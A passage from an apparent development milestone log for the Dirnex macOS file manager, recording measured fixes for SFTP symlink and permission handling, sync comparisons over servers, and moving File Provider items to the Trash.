+   shared lexer takes the size when it fits and falls back to the first arrow otherwise, so it can
+   only ever *sharpen* a target; the exec parser additionally **requires** the match and drops what
+   it cannot verify, because there the alternative is a real link pointing somewhere nobody wrote.
+   **The correction: the failure this slice prevents was a crash, not a broken link.** This file and
+   docs/NOTES.md both recorded that proceeding with no target "would write `ln -s "" link`" — true of
+   the *syscall* (`symlink("")` returns 0 and leaves a 0-byte dangling link, measured) and true over
+   SFTP, and **not** true of a download, which is the common direction: `LocalBackend` puts the target
+   through `fileSystemRepresentation`, which raises `NSInvalidArgumentException` for the empty string
+   — an Objective-C exception nothing can catch, so copying a folder of links off a server terminated
+   the process. Two independent fixes, and the controls show they are independent: the engine now
+   refuses a `nil` target by name, and `LocalBackend` passes an **empty** one to `symlink(2)` directly
+   so a link that really does point at nothing stays copyable. That distinction — absent is not empty
+   — is Slice 1's rule about a `nil` mode arriving one type along.
+   Controlled in six directions, each failing only the tests that name it: the size column ignored,
+   the refusal removed (which reports `succeeded → true` over a broken link — the shipped bug), the
+   latch fired on any unanswered path rather than on no answer at all, the parser accepting a target
+   the size contradicts (which hands over the truncated `weird`), the children resolved one at a time,
+   and the empty-target guard removed — the last terminating the host with the exact exception, which
+   is the control saying what kind of bug it is.
+   **Verified live against a throwaway `sshd`**, through the real `SFTPProcessTransport` and the real
+   `CompositeBackend`: the server's own links come back with the targets it was given, a dangling one
+   keeps its text, a target containing ` -> ` survives, and a downloaded folder of links lands as
+   links pointing where the server's do. The live control is what makes that evidence — with the exec
+   read removed the same run fails all three tests and the copy comes back
+   `symbolicLinkTargetUnreadable(name: "abs")`, which is the degradation end to end rather than a
+   silent empty link.
+   **And one bug found a layer earlier, fixed on Oleg's call because the fix deletes shipped
+   behaviour**: `SFTPListingParser` split a name at ` -> ` as well, so a link *named* `a -> b` was
+   listed under the shorter name `a` before anything asked about a target — a wrong **file name**,
+   which a copy then writes to disk, and one the size column cannot rescue because the coincidence is
+   exact (size 1, trailing `b`). `sftp`'s own `ls` provably never prints a target (re-measured against
+   OpenSSH 10.2), so every arrow it emits belongs to a name and the split was answering a dialect this
+   parser is never fed — its "compatibility with a plain shell `ls -la`" test was pinning a fiction.
+   `unixRow` grew a `splitsLinkTarget` seam so only this dialect opts out; the control reproduces the
+   old reading exactly (`name: "a"`, target `"b"`) and fails only the one test that names it, and the
+   live run now reads `a -> b` end to end against a real server.
+5. **Get Info's write half**, on the verbs slices 1–2 establish. Landed as **5a** below; the two
+   halves it was bundled with are 5b and 5c, split on Oleg's call because each is a pass of its own.
+   **Landed 2026-08-28.** The probe overturned the design the slice opened with, and it is the
+   milestone's own subject arriving one layer further in.
+   **`sftp`'s `chmod` reports success for a mode the server did not store.** Measured against a real
+   `sshd`: `chmod 2755` on a file whose group the account is not a member of exits **0**, prints
+   **nothing**, and leaves `100755` — set-group-ID silently gone. It is POSIX's rule for `chmod(2)`
+   rather than OpenSSH's choice, so it is true of every server, and the control is what makes it a
+   fact about the write rather than about this one: the identical command on a file in a group the
+   account *is* in stores `102755`, same session, same binary. Set-uid and sticky are unaffected, so
+   a probe testing either reports a preservation that is only two-thirds there.
+   So a panel that reported "saved" on a clean exit would be doing exactly what this milestone exists
+   to prevent, and **Save ends in a re-read** (``RemoteAttributeVerdict``): what is on screen
+   afterwards is what the item carries, never what was sent. A gesture the user made can afford one
+   round trip where the bulk carry cannot — which is why Slice 2 pays nothing per file and this pays
+   once. The asymmetry that keeps it honest is that the **mode** is verifiable this way and a
+   **timestamp is not**: a remote `stat` is a listing row, minute-resolution over `sftp` and
+   zone-less over FTP's `LIST`, so judging a written time against one would report a false refusal
+   for an exact `MFMT` — an hour off for every user in a different zone from their server.
+   **What is offered is decided per connection and per row**, both gates and both necessary: the
+   listing must have reported the field (a control for a mode the server never named would invent
+   its own starting value) and the account must still honour the verb. That makes it a mode over
+   SFTP, a mode **and** a modification time over FTP — the richer protocol here, which inverts the
+   expectation the rest of this milestone sets — and nothing over an object store or an archive.
+   **Owner and group are deliberately absent, and the probe is why**: `chown`/`chgrp` take a numeric
+   id while `sftp`'s `ls -la` prints *names*, so a panel built on a listing has nothing to send — and
+   a remote `chgrp` clears set-uid and set-gid as a side effect (`106755` → `100755`, exit 0, nothing
+   printed), so offering it would need both the missing id and the ordering rule
+   ``AttributeChangePlan`` already encodes locally.
+   **Not undoable, and the panel says so.** ⌘Z reverses an attribute change through
+   `FileAttributeIO`'s syscalls, a local-only executor; a backend-driven undo step is its own piece
+   of work. §6 is explicit that a non-reversible operation is marked rather than silently dropped,
+   and the note is that mark.
+   Controlled in seven directions, each failing only the tests that name it: the read-back removed
+   (which reports the silent downgrade as a success — the shipped bug), the timestamp judged against
+   the listing that reads it back, the change ignoring what the connection can do, editability
+   ignoring whether the listing reported the field, the composite's forward dropped, the pane always
+   answering read-only, and the save believing the clean exit.
+   **Two of those controls were inert on first writing and that is the finding worth keeping.**
+   Every panel test built the controller directly, so a pane that opened *every* remote panel
+   read-only left them all green — the pane's own decision had to be split out
+   (`remoteEditability(for:)`) before anything could see it; and the silent-downgrade test asserted
+   the redraw rather than the report, which is true under both branches, so the panel had to hold
+   what the last Save achieved (`lastVerdict`) before a control could move it. A control that does
+   not fire is not a passing control.
+   **Verified live twice over**: a checked-in suite driving the real `SFTPProcessTransport` against a
+   throwaway `sshd` (16 real sessions in one run, counted in the server's own log), and then the
+   built app on a restored SFTP tab — the panel drew 9 mode boxes and 3 special bits with no date
+   control, ticking set-GID enabled Save and produced `2755`, and the verdict came back
+   `refused=[permissions] landed=755`. The narrowness half ran in the same shape with only the
+   file's group changed: `refused=[] complete=1 landed=2755`, and the file on disk `-rwxr-sr-x`.
+6. **The sentence that says what a copy could not keep** — Slice 2 accumulates the loss and left
+   choosing its surface here. Oleg's call: a **status line after the job**, non-modal, because the
+   routine case is not rare — the server-side `cp` route drops the modification time on *every*
+   same-account SFTP duplicate, so anything modal would fire constantly.
+   **Landed 2026-08-28 as 5b.** The surface was the decided part; the *window* was not, and it is
+   what the slice is really about. Slice 2's accumulator spans a **connection's whole life**, which
+   is the right expiry for a fact about a server and the wrong one for a sentence about a copy — read
+   directly it would tell a user about their previous transfer every time. So the answer is a
+   **difference of two readings** (``RemoteMetadataTally``, sampled by `CopyEngine` at each end and
+   subtracted), which is also why the draining `takeLoss()` Slice 2 wrote and deleted stays deleted:
+   a drain has to be called exactly once by exactly one caller and nothing says so, where two
+   readings can be taken by anybody in any order.
+   **Counts per aspect, not a set**, and that is the load-bearing detail: a set difference cannot
+   tell "lost again" from "lost earlier", so a connection that ever dropped a mode would go on
+   reporting it for the rest of its life. And the reading is **per path**, because a job with ends on
+   two accounts must add up *those* two while a job running concurrently on a third must not be
+   counted into it — the queue serializes jobs sharing an account, not jobs on different ones.
+   The wording collapses the core's four aspects into the two families a user can act on
+   (permissions, dates); the carry needs the finer distinction and a reader cannot use it. Measured
+   across all fourteen catalogs before being written: widest **363 pt** against the status line's
+   **542 pt** budget, and unlike M21 Slice 11's give-up message this one interpolates no file name,
+   so its length is bounded. Plural variations in every language, Slavic `one/few/many/other`
+   included.
+   Controlled in six directions, each failing only the tests that name it: the report giving the
+   connection's whole life instead of the job's delta, a set-shaped difference, no clamp across a
+   reconnection, one sentence for every loss, the special bits falling out of the permissions family,
+   and a skipped item's landing guessed from its source.
+   **The forward shipped missing, and only the live run found it.** `CompositeBackend` never
+   forwarded `metadataTally(at:)`, so it inherited `VFSBackend`'s `.zero`, every job's delta was
+   zero, and every copy looked lossless — with both full suites green and nothing logged. That is the
+   M22 `subtreeListing` failure exactly, one milestone later, in a session that had *already* written
+   a routing test for the sibling verb for that very reason. The regression test is the interesting
+   part: a healthy connection's tally and a missing forward's are **both zero**, so the discriminator
+   had to be a fake transport declaring *no* capabilities, which makes every transfer through it
+   record a loss.
+   **Verified live against a real `sshd`, with a narrowness control in the same shape.** A
+   same-account duplicate of a file stamped 2018 landed stamped *now* — the `cp` route carrying no
+   timestamp, as Slice 3 measured — and the pane read
+   `Copied — the modification time wasn't kept on 1 item`, the singular plural form chosen correctly.
+   The same build, same gesture, two local panes: the copy kept 2018 **exactly** and produced **zero**
+   status lines.
+7. **Synchronize by size** — the comparison that is honest on a side with no exact clock, which
+   comparing by *contents* now joins, since M24 Slice 4 taught ⌥F3 to fetch both sides at a price
+   the plan can state up front. Note that Synchronize is gated `backend == .local` on **both** panes
+   today (`PanelViewController.canSync`), so this slice widens a gate before it adds a comparison.
+   **Landed 2026-08-28 as 5c**, less the contents half, which was a slice of its own on Oleg's call:
+   comparing contents across a server is a fetch per candidate pair inside a scan that had no
+   progress bar and no Stop, and doing both at once would have made each one's evidence weaker. That
+   half landed as **5d** below, and the deferral's own reason is what its shape answers — the fetch
+   is a queued job, which has both by construction, and the scan gained a Stop of its own.
+   **The probe overturned the sentence this slice was written around.** It says timestamp comparison
+   is refused "for FTP and S3 and always will be", which names two of the three: measured against a
+   real `sshd`, **SFTP's listing is coarse too**. `ls -la` prints `Aug 20 11:33` for a file whose
+   true mtime is `11:33:37` — the seconds are gone — and `Dec 20  2025` for one older than about six
+   months, where the time of day goes entirely and the parse lands at local midnight, **41 617 s**
+   from the truth. Against the two-second tolerance that reports a difference for fifty-nine of every
+   sixty recent files and for every old one. The half that reads as safe and is not: **two sides of
+   the same dialect are no better**, since two files thirty seconds apart both list as the same
+   minute, so a mirror calls them identical and skips the one that changed. So the rule is a clock on
+   **both** sides, and only the local disk has one — a predicate under a new name rather than the
+   deleted `hasApproximateTimestamps`, which asked the narrower question (two readings of *one* file)
+   and answered FTP alone.
+   **The scan is a connection per directory, and the seam to fix it already existed.** Seventeen
+   directories cost **1010 ms** as separate `sftp` invocations against **76 ms** for one exec walk on
+   loopback, so a side is gathered through `VFSBackend.subtreeListing` — M22's search seam, which
+   turns out to encode "everything under here" rather than anything about searching — and a backend
+   without one answers `nil` and the walk is unchanged. The hazard it brings is the whole of its
+   design: a **capped** answer falls back to the walk rather than being used, because a mirror over a
+   subtree that stopped early deletes the other side's matching files. The control is sharp — using a
+   capped listing anyway reports **zero rows** for a tree whose difference sits at depth two, which
+   is "already in sync" about the top of it.
+   **And the sentence the sheet showed before deleting anything was a lie about a server.** It
+   promised the Trash unconditionally — true while both sides were on this disk, and false the moment
+   one is an account, where no backend implements `trashItem` and the files are gone. It is the
+   worst-placed lie available, since it is what somebody reads *while deciding*. `SyncDeletePlan`
+   splits the counts by each path's own `deleteStrategy`, a mixed run says both halves in sentences
+   carrying one count each (so every plural stays expressible without the `substitutions` machinery),
+   and the run is two `DeletePass` passes rather than one guessed flag. A read-only side's items are
+   a third bucket: named, and counted nowhere.
+   Controlled in six directions, each failing only the tests that name it: the clockless comparison
+   ranking by the stamp after all (which answers `.leftNewer` — what a bidirectional sync would act
+   on), a capped subtree used anyway, a prefetched side falling through to a listing, the gate back
+   at `backend == .local`, the gate asking `capabilities` instead of `capabilities(for:)`, and the
+   one sentence promising the Trash for every run.
+   **Verified live three ways.** A checked-in suite (`SyncLiveIntegrationTests`) drives the real
+   `SFTPProcessTransport` against a throwaway `sshd`: a local tree and the server's compare across
+   two backends, the equal files are omitted, the differing one is `.differ` and deliberately not
+   ranked — and the same pair compared *by date* reports a difference in a file nothing has touched,
+   which is the withdrawal's own justification measured rather than asserted. Then the same suite
+   against a server built to refuse (`ForceCommand internal-sftp`): the shortcut answers `nil` and
+   every other test passes through the walk, which is the degradation end to end. Then the built app
+   on a restored SFTP tab, where the server's log is the judge: the gesture produced **one** exec
+   session against **zero** for eight idle seconds — and the control, the gate reverted, produced
+   **zero** for the same gesture on the same seeded session while the pane went on listing.
+8. **Synchronize by contents, on a side that is not local** — the half 5c deferred, landed as
+   **5d 2026-08-29**. Comparing bytes was never dishonest over a server; it was **unbuilt**, because
+   the engine reads through an injected comparator that only ever sees real local paths. So the rule
+   `SyncComparison.available` applied — both sides on this disk — was a fact about the code rather
+   than about the answer, and what replaces it is a fetch the user is shown the price of.
+   **Two phases over one walk, which is the shape and the whole economy.** Nothing can know which
+   files a content comparison will read until both trees have been walked, so the scan walks once
+   (``DirectorySync.survey`` — classify by size, keep the identical rows), names the pairs whose
+   bytes decide the answer (``contentCandidates`` — both sides present, both regular files, same
+   size), hands *those* to the M24 funnel to be weighed, confirmed and fetched, and re-answers the
+   same rows (``recompare``) with the copies that arrived. One walk rather than the two checksum
+   verification had to settle for: the rows **are** the plan, so the set the confirmation counted
+   and the set the comparison reads cannot drift. It also made switching the picker free — a
+   comparison is a question about the same snapshot, and over a server re-walking is a connection
+   per directory for rows nothing has moved.
+   **The clock rule had to split in two, and that is the bug this slice would otherwise have
+   shipped.** Reading bytes settles *whether* two files are equal and says nothing about which came
+   later, so `.content` still ranks by the stamp — and it can now span a pair whose listings have
+   none. `usesModificationDates` is a fact about the comparison; whether the clock may be *believed*
+   is a fact about the **pair** (`believesModificationDates(between:and:)`), derived inside `compare`
+   from the two roots it already holds so no caller can get it wrong. Its second half is the
+   fallback: what a content scan cannot read — a symlink, a special file — falls back to **size
+   alone** over a coarse pair, or every link in the tree reports a difference on every scan.
+   **An evicted cloud placeholder is refused, not fetched**, which is the one place this differs from
+   ⌥F3 over the same bytes. A placeholder cannot be *weighed* — `MaterializationPlan` excludes it,
+   since `CloudDownloadPrompt` is its own progress surface — so fetching every one a tree walk
+   discovered would be an unbounded download with no total in front of it. M14's rule unchanged: a
+   file somebody pointed at downloads, a tree sweep refuses. A remote row is the opposite case and is
+   why the slice exists — it is not a file at all until it is fetched, and what it costs is exact.
+   The funnel grew the one thing it lacked: `onAbandon`, because a declined download has to reach a
+   caller that is **showing** something. Every other M24 gesture leaves nothing behind when it does
+   not happen; the sheet asks while displaying a comparison, so a decline puts the picker back rather
+   than leaving it saying "Downloading files to compare…" for the session. The sheet's scan also
+   gained the Stop it never had, tied to the sheet going away — which is the other half of what made
+   this a slice of its own, the fetch itself having the queue's bar and Stop by construction.
+   Controlled in eleven directions, each failing only the tests that name it: five in the core (the
+   pair's clock ignored when ranking, the content fallback reading a date it cannot believe, the
+   survey dropping its identical rows, every both-sides row a candidate, structural rows re-derived)
+   and six in the app (the fetch asked for every row, a comparison change re-walking, a stopped
+   transfer telling the sheet nothing, the comparison applied before the download is answered, the
+   map built from what moved rather than from what is readable, the pass reading the rows' own paths).
+   **Two controls were inert on first writing and both are the finding worth keeping.** The
+   re-walk control passed because the test waited on `comparison`, which is assigned *synchronously*
+   on the way in — so it was satisfied long before any walk landed, and the listing count was read
+   too early. A wait on a value the code under test sets before doing the work is a wait on nothing.
+   And a control's own edit did not match the file it was aimed at, so it reverted nothing and
+   reported a pass; the text has to be checked, not assumed.
+   **Verified live against a throwaway `sshd`**, through the real `SFTPProcessTransport`: a local
+   tree against the server's, walked once, three candidates fetched, and `same-size.bin` — five bytes
+   on both sides and different bytes — reported as a difference no size or date comparison can see,
+   still deliberately unranked, with the byte-identical pairs read and dropped. Both live controls
+   fire on demand (no pair ever read, and the survey dropping its identical rows: 6 issues each
+   against a green baseline), and the server's own log prices the candidate rule at **98 sessions
+   against 99** when every both-sides row is treated as a candidate — one extra login for the one
+   pair a size mismatch had already settled.
+   One thing about reading that run is worth keeping: an assertion inside `offCooperativePool` is
+   filed under **`Test «unknown»`** while its test still prints a tick, so a grep for `✘ Test "`
+   matches nothing and the control reads as inert. The run summary's **issue count** is the
+   instrument. The same shape one door along: `-only-testing:` naming a single Swift Testing function
+   selected **0 tests** and reported success — again, read the count, not the verdict.
+   **And the gesture itself in the built app**, on two seeded local panes: `run operation
+   "file.syncDirectories"` surveys four rows and names two candidates, `Size & Date` draws
+   `only-left.txt` and `sizes.txt` — and `pair.txt`, five bytes on both sides with the same mtime and
+   different bytes, is **invisible** to it. The content pass finds exactly that row, while
+   `twin.txt`, byte-identical, stays omitted: the claim and its narrowness control in one run. Two
+   things about driving it are worth keeping — the sheet is app-**modal**, so `quit` is refused and a
+   `Timer.scheduledTimer` never fires (a `.default`-mode timer is not serviced in `.modalPanel`; add
+   it to `RunLoop.main` in `.common`), and the panel's segmented control cannot be reached from
+   AppleScript at all, which is why the picker had to be poked by a temporary action.
+   **The live suite then destabilised a neighbour, and the bisect is the reason that is a sentence
+   rather than a suspicion.** With a live server configured the app suite failed **4 full runs of
+   6**, always in `RemotePreviewFetchTests` — a suite docs/NOTES.md already records as starving on a
+   busy main actor. Skipping *this slice's* three suites gave 1 of 6; skipping only the **live** one
+   gave 1 of 6 as well, so the load is five live tests holding the main actor for seconds at a time
+   and not anything the headless additions do. The repair is the one that entry licenses: a wait
+   **for** something is free to be generous, so its 10 s budget became 30 s — a satisfied predicate
+   returns on the next poll, and the budget only decides how much scheduling delay is absorbed
+   before the code gets the blame. Re-measured: **1 in 6**, the tree's own baseline, with no test of
+   this slice's among the failures. Its `hold(until:)` neighbour is deliberately untouched: there
+   the length *is* the claim.
+
+### M26 — Move to Trash, wherever the file lives (S)
+
+Opened and closed 2026-08-31: five slices in a day, plus the milestone's own end-to-end run through
+the shipped F8 against all five live File Provider domains. It is the one milestone here that opened
+**on a design fork rather than on an implementation** — the bug had been measured to the byte, and
+the three routes out of it cost different things, so the fork went to the user before any Swift was
+written. Its own last slice then retired the premise the first four rest on: the `ptbL`/`ptbN` Put
+Back record Slice 2 called one "this package can read and cannot write" turned out to be writable,
+which is why **Finder's** Put Back works for a provider delete and not only Dirnex's. The premise
+below is left standing as it read at open.
+
+**F8 does nothing for any file inside a File Provider domain** — Dropbox, OneDrive, Box, Google
+Drive and iCloud Drive alike — and reports *"Couldn't move “x” to the Trash · You don't have
+permission. Dirnex may need Full Disk Access in System Settings."* Reported by a user 2026-08-30,
+present since those mounts became browsable, and the sentence is the worst part: Full Disk Access is
+granted, is *correct*, and toggling it does nothing, so the report reads as the app being confused
+about a permission the user can see is switched on.
+
+**It is not a permission the app lacks, and the probe that says so is the whole finding.** At the
+instant `FileManager.trashItem` throws — `NSCocoaErrorDomain` **513**, with **no underlying POSIX
+errno**, so nothing beneath it refused anything — the same process was asked what it could actually
+do with that file:
+
+```
+[trashItem]             NSCocoaErrorDomain 513   under=nil
+[read ~/.Trash]         OK  3 entries
+[open O_RDONLY]         OK
+[rename in place]       OK
+[rename into ~/.Trash]  OK
+[stat]                  OK
+```
+
+It can perform the very move `trashItem` claims it may not. So `FileManager` is declining on its
+own, and no grant the user can reach changes it: `tccutil reset FileProviderDomain com.dirnex.Dirnex`
+removed every per-provider row and nothing changed, macOS never prompts, and no TCC service is
+consulted during the call at all.
+
+**What decides it is how the app was launched, which is why it survived every pass.** Same binary,
+same Developer ID signature, back to back: launched from a shell it trashes fine (**2/2**), launched
+by LaunchServices — the Dock, Finder, `open` — it fails (**2/2**). A shell-launched app inherits the
+launching process as its TCC *responsible* process, so a developer running from a terminal borrows
+that process's Full Disk Access and sees a working feature. Every automated signal is clean, both
+suites and both linters are green, the pane lists the folder perfectly, and only pressing F8 from a
+normally launched app shows it. The same trap wasted the first two diagnoses of this bug (▸
+docs/NOTES.md), which is the reason it is written down here rather than only in the fix.
+
+**`NSWorkspace.recycle` is *not* the answer, and the run that said it was is the lesson.** It was
+measured succeeding in the failing context on all five domains — and that measurement was
+contaminated by the diagnostic probe sitting a few lines above it, which had renamed each item out
+to `~/.Trash` and straight back before `recycle` was asked. Implemented for real, with no probe in
+front of it, `recycle` fails with the byte-identical `NSCocoaErrorDomain` 513 — it wraps the same
+`trashItem` refusal. Re-adding the bounce as a control flips it back to succeeding, 1/1 each way.
+The probe had **detached the item from its provider**, so what was being measured was a trash of an
+ordinary file. This is docs/NOTES.md's own rule about a probe's actions being part of the experiment,
+met for the third time in one investigation.
+
+**What is established, and what is not.** Established: the refusal is exact and reproducible; it
+covers every File Provider domain and nothing else; it follows the TCC *responsible* process, not
+the app's own grants; and the process is not missing any file permission — at the instant of the
+throw the same process can `open` the item, `rename` it in place, `rename` it into `~/.Trash`, and
+read `~/.Trash`. **Full Disk Access is effective in both cases and is not the gate** — the failing
+LaunchServices-launched process read the system TCC database and `~/Library/Mail`, both FDA-only,
+in the same call that was refused. Three candidate mechanisms have been measured and eliminated:
+the per-provider `kTCCServiceFileProviderDomain` grants (resetting them changes nothing, and macOS
+never prompts), Full Disk Access (above), and `kTCCServiceSystemPolicyAppData`'s odd `auth_value 5`
+(shared with the process that *succeeds*). Not established: which policy actually denies, and
+therefore whether any grant the user can reach would fix it.
+
+So the milestone was **open on its design**, not on its implementation. Put to the user on
+2026-08-31, the fork below was resolved as **route by domain, one performer** — the first option,
+with `trashItem` kept wherever `trashItem` works, so the regression it costs falls only on the items
+that were already broken:
+
+- **Perform the move ourselves.** A plain `rename` into the right trash is measured working from the
+  failing process, so this cannot be refused. It costs Finder parity: the collision-safe naming and,
+  more seriously, the `ptbL`/`ptbN` **Put Back** record, which this package can read (`DSStoreReader`)
+  and cannot write. Trading "delete does not work at all" for "delete works, Put Back does not" is a
+  real improvement and a real regression, and which one is a person's call.
+- **Ask Finder**, whose own delete succeeds on these files. That is an Apple event, so it needs the
+  Automation grant and Finder running, and it makes the most ordinary gesture in the app depend on
+  another process.
+- **Keep looking for the grant**, which is the only route that ends with the platform doing this
+  properly — and the three cheapest candidates are already eliminated.
+
+**The design is one path, not a fallback.** `NSWorkspace` and any Apple event are AppKit, and
+`LocalBackend.trashItem` is headless core, so whichever route wins takes the seam the project already
+uses for `bsdtar` and `sftp`: the core keeps the decision (the already-in-a-trash refusal, the
+Trash-less-volume refusal ``trashFailure`` reads, the landing path a `Restoration` needs) and an
+injected performer does the byte-touching. Keeping a second route alive as a fallback is rejected at
+open: two paths differing only by which one macOS happens to refuse is exactly the shape this
+codebase keeps paying for.
+
+- **Slice 1 — core.** ``TrashPerformer``, a one-method seam returning where the item landed; the
+  `alreadyInTrash` guard and ``trashFailure`` stay where they are; tests drive a fake.
+  **Landed 2026-08-31**, and it is the half that holds whichever way the fork above goes: every
+  candidate performer plugs in here, and the suite already pins that both refusals the backend owns
+  survive the seam (negative control: neutering it fails 4 of the 5 tests, and correctly leaves the
+  already-in-a-trash one green, since that never reaches a performer either way).
+- **Slice 2 — the performer that works. Landed 2026-08-31.** ``ProviderAwareTrashPerformer``:
+  `FileManager.trashItem` for an ordinary item, and the rename macOS would have made for one inside a
+  domain. It is **core, not app** — nothing in the answer is AppKit, so §2 puts it with the bytes it
+  touches, and it is `LocalBackend`'s default rather than something the app injects, so the fix
+  reaches every caller without one of them having to remember. `WorkspaceTrashPerformer` was written,
+  live-tested and **removed** before this: it is not a fix, and leaving it would have been a second
+  route that fails exactly where the first one does.
+  - **Every part of it was measured against the five live domains before any Swift was written**, and
+    two of the measurements overturned the design the slice opened on. The destination is **not**
+    `~/.Trash`: renaming an evicted placeholder out of its domain **materializes it** — a 4 MB iCloud
+    file took 1.15 s and arrived with blocks — where the rename into the provider's own trash took
+    **0.001 s and left it dataless**, exactly as `trashItem` does. On a 14 GB placeholder that is the
+    download-nobody-asked-for the M24 risk row names, arriving inside a delete. And the destination
+    cannot be tabulated per provider (docs/NOTES.md is emphatic that a real delete is the only thing
+    that answers), so it is **asked of Foundation and then verified with a `stat`** — the pair agrees
+    with `trashItem`'s own destination on all five domains plus both controls, where the lookup alone
+    disagrees on two and names a `.Trash` for Box and OneDrive that does not exist.
+  - **`renamex_np` with `RENAME_EXCL`, never `rename`**, which replaces its destination silently and
+    would destroy the copy the user had already thrown away. The collision name reproduces
+    `trashItem`'s own measured format, because a Trash holding items Dirnex named one way and Finder
+    another is a surface the user reads.
+  - **Verified live with a control, which is the only instrument this bug has**: the same script,
+    LaunchServices-launched, across all five domains — **5 of 5 deleted** with the fix and **0 of 5**
+    with `LocalBackend`'s default reverted, the files landing in exactly the trashes the table
+    predicts. What ⌘Z does is unaffected either way: `DeletePass.Restoration` rides the landing path,
+    not Finder's record.
+  - What it costs is **Finder's `ptbL`/`ptbN` Put Back for a provider item only** — this package can
+    read those records and cannot write them. An ordinary delete is byte-for-byte what it always was.
+    Slice 4 takes that cost back for Dirnex's own deletes, from the origin the delete already knew.
+- **Slice 3 — the sentence. Landed 2026-08-31**, re-taken rather than executed as written, and the
+  re-take moved it off "over a refusal nobody has yet seen in the wild": **it is reachable today, in
+  one keystroke.** A Google Drive mount root is `dr-x------` — measured on both live Drive accounts,
+  where creating a file answers `EACCES` — so every refusal it hands back arrives as
+  `EACCES` → `.permissionDenied` → the sentence that cost a user an evening, on the *new* route.
+  The 513 refusal is indeed gone (a provider item no longer goes near `trashItem`); what replaced it
+  reaches the same wrong words by a different door.
+  - **The fix is the M21 split arriving on a path that is on this Mac.** `VFSErrorText` already asks
+    `path.backend.isRemoteConnection`, because "Dirnex may need Full Disk Access" is a claim about
+    *where* the failure happened. A `CloudStorage` mount is an ordinary local path with an ordinary
+    local backend, so that test cannot see it — and Full Disk Access does not gate that tree, so the
+    advice names a switch that is already on and could not help if it were off.
+    ``CloudStorageMounts/isInsideCloudStorage(_:home:)`` is the predicate: pure, no I/O, free to ask
+    on an error path, and living beside the root and the not-TCC-gated fact it rests on.
+  - **The narrowness is the whole design, and the two provider roots are opposites for this
+    question.** `~/Library/Mobile Documents` **is** TCC-gated, so Full Disk Access is exactly right
+    for an iCloud path — which is why the branch names `CloudStorage` alone rather than reusing
+    ``TrashLanding/providerRoots``, whose two entries are twins for the trash route. One pair of
+    roots, two questions, and only a name keeps them from being merged.
+  - **Both controls run, and they fail on disjoint tests**, which is what makes the seven green ones
+    evidence: disabling the branch fails the two fix tests with the reporter's own sentence verbatim
+    and leaves all five narrowness tests green; widening it to both provider roots — the "stop saying
+    it inside a provider domain" version this slice was originally written as — fails *only* the
+    iCloud test, taking the correct advice away with the wrong one. The assertions are
+    language-independent (which sentences match, not what they say), since the app test target
+    inherits the developer's own `AppleLanguages` pin; the English wording is checked behind a guard.
+  - The new sentence is translated into all fourteen languages in the same pass, so it cannot join
+    the class docs/NOTES.md documents where a wrapped-but-uncatalogued key compiles to itself.
+    Note `scripts/check_localization_keys.py` **already failed on five strings from the pack work**
+    (`Pack…`, `Packing…`, `Pack %@`, `Packing %@`, `Couldn't create the archive "%@"`), absent from
+    the catalog on HEAD and untouched by this slice — a separate gap, in separate files, and it took
+    its own pass: the five landed in all fourteen languages immediately afterwards, and the script
+    now reads **970 extracted keys, all present in the catalogs**.
+- **Verified end to end in the app, 2026-08-31**, which is the half Slice 2's script could not
+  reach: the same five domains driven through the *shipped* F8 — `reveal` then
+  `run operation "file.trash"` over the AppleScript verbs — against a LaunchServices-launched build,
+  since a shell-launched one borrows the terminal's grant and passes either way. **6 of 6 deleted**
+  with the fix, each landing in exactly the trash the table above predicts, including the two that
+  are not the obvious answer (Drive streaming → `<mount>/.Trash`, iCloud →
+  `~/Library/Mobile Documents/.Trash`). With `LocalBackend`'s default reverted to
+  `FileManagerTrashPerformer`, **1 of 6** — and *which* one is the whole value of the run:
+  **mirror-mode Google Drive still deleted in both directions**, because `~/My Drive` is an ordinary
+  local file outside every domain, so it takes `trashItem` either way and keeps Finder's Put Back.
+  A control that failed there too would have been measuring a broken app or a bad path rather than
+  the routing; passing in both directions is what makes the other five a measurement of exactly the
+  provider branch and nothing wider. No confirmation sheet stands in the way — `confirmTrash`
+  defaults off — so the whole gesture is drivable headlessly, which is what makes this repeatable
+  rather than a one-off screenshot.
+- **Slice 4 — Put Back for a provider delete. Landed 2026-08-31**, taking back the one regression
+  this milestone knowingly introduced: `trashItem` writes Finder's `ptbL`/`ptbN` pair and the rename
+  that replaces it cannot, so an item Dirnex trashed out of a domain lands correctly and then has no
+  way home.
+  ⌘Z is *not* the gap — `DeletePass.Restoration` rides the landing path and undo works — but the
+  journal is a session-scoped stack, where Put Back is the gesture for an item sitting in the Trash
+  a week later.
+  - **The data already exists at the moment of the delete, which is what makes this a store and a
+    read rather than a measurement.** `DeletePass.run` already builds
+    `Restoration(original:trashed:)` — origin and landing — for *every* trashed item, because ⌘Z
+    needed it; and `TrashPutBack.origins(inDSStore:ofTrashAt:)` already hands the app a
+    `[String: TrashOrigin]` keyed by the filename **as it appears in that trash**, which the restore
+    flow matches a listing into. So the slice is a durable record in that same shape and a merge at
+    the one call site that reads it. Nothing in `TrashPerformer` changes.
+  - **Finder's record wins wherever it exists, and the store is only ever consulted for what it does
+    not cover.** An ordinary local delete still goes through `trashItem`, which writes the pair — so
+    the common case must keep answering from the `.DS_Store` and not from us, or Dirnex's Put Back
+    and Finder's own could send the same file to two different folders. That is the merge rule and
+    it is the whole correctness argument: a second source of truth for a question already answered
+    is the shape this codebase keeps paying for, so this one answers only where the first is silent.
+  - **Key on the full landing path, not the filename.** `origins` is keyed per trash directory
+    because a `.DS_Store` only ever describes its own; the merged Trash spans `~/.Trash`, every
+    volume's, iCloud's and every provider mount's at once, and two of them can hold the same name.
+  - **It must respect ``VaultPrivacy``, which is the reason this is not simply "record every
+    delete".** A record pairs a file's name with the folder it came from and outlives both — exactly
+    the *implicit* memory M19 §6 keeps vault paths out of, and a file deleted from inside a mounted
+    vault would otherwise leave its name and its origin in a plain store outside the vault. The
+    frecency index and session restore already have this rule; a third store needs it before it
+    ships, not after.
+  - **Records go stale and that is tolerable; unbounded growth is not.** Finder's own outlive their
+    files by weeks (measured — the probe machine's `~/.Trash` still listed records for files long
+    gone), so `origins` is deliberately a *superset* the caller matches into, and ours may be too.
+    What it may not be is permanent: drop an entry whose landing path no longer exists, on the read
+    that is already enumerating those trashes anyway.
+  - **The bonus worth naming is iCloud, which M9 left undone for a reason this route sidesteps.**
+    Put Back inside `~/Library/Mobile Documents/.Trash` has never worked for anybody: that trash
+    keeps no `.DS_Store` at all, and the origin rides on the item as
+    `com.apple.clouddocs.private.trash-parent-bookmark`, an opaque provider reference with no path
